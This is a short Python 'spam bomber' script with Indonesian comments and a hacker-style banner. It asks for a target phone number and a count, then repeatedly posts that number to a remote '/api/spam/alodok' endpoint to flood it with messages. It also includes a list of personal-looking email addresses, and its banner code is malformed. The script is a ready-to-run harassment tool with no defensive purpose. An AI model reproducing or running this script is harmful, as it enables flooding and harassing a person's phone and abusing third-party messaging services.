
try:    # Janggan di ubah
        import time,sys,os,json,requests,random
except ModuleNotFoundError:
         print ('[!] Install Modul Requests')
         os.system('pip install requests')

try:    # Janggan di ubah
        ip = requests.get('https://api.ipify.org').text
except requests.exceptions.ConnectionError:
        exit(' [!] Koneksi Internet Error')

# Janggan di ubah
Email = random.choice(['lavon.lockman@gmail.com','duane_mclaughlin38@gmail.com','alfreda.lindgren@gmail.com','leonardo_kuhlman@gmail.com','lyric51@gmail.com','devonte_littel@gmail.com','newell.kuhic@gmail.com'])
# Janggan di ubah
Name = random.choice(["Halo Penipu","Halo Kawan","Halo Sayang","Halo Janda","Halo Ripper"])

a,m,h,k,b,u,c,p,bn,o = [
'\033[90m',
'\033[31m',
'\033[32m',
'\033[33m',
'\033[94m',
'\033[35m',
'\033[36m',
'\033[37m',
'\033[41m',
'\033[0m'
]


os.system('clear')
print("""
Banner = """

                   \033[31m[ WELCOME TO PROGRAM ]

                    \033[31m |-DemoNZxx-|
\033[37m[•]───────────────────────────────────────────[•]
\033[31m | [X]  Author  : DEMON 		       |
\033[31m | [X]  TEAM    : XXXXX                        |
\033[37m[•]───────────────────────────────────────────[•]"""

""")

num=input("[In] \033[31mNumber \033[37m: ")
jum=int(input("[In] \033[31mAmount \033[37m: "))

print("\n[RESULT]")
for x in range(jum):
	try:
		req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok",
			data={"number":num})
		if req.json()['status'] == 'ok':
			print(f"{x+1}. Succsess {num}")
		else:
			print(f"{x+1}. Failed {num}")
	except Exception as e:
		print(f"{x+1}. Pass: {e}")
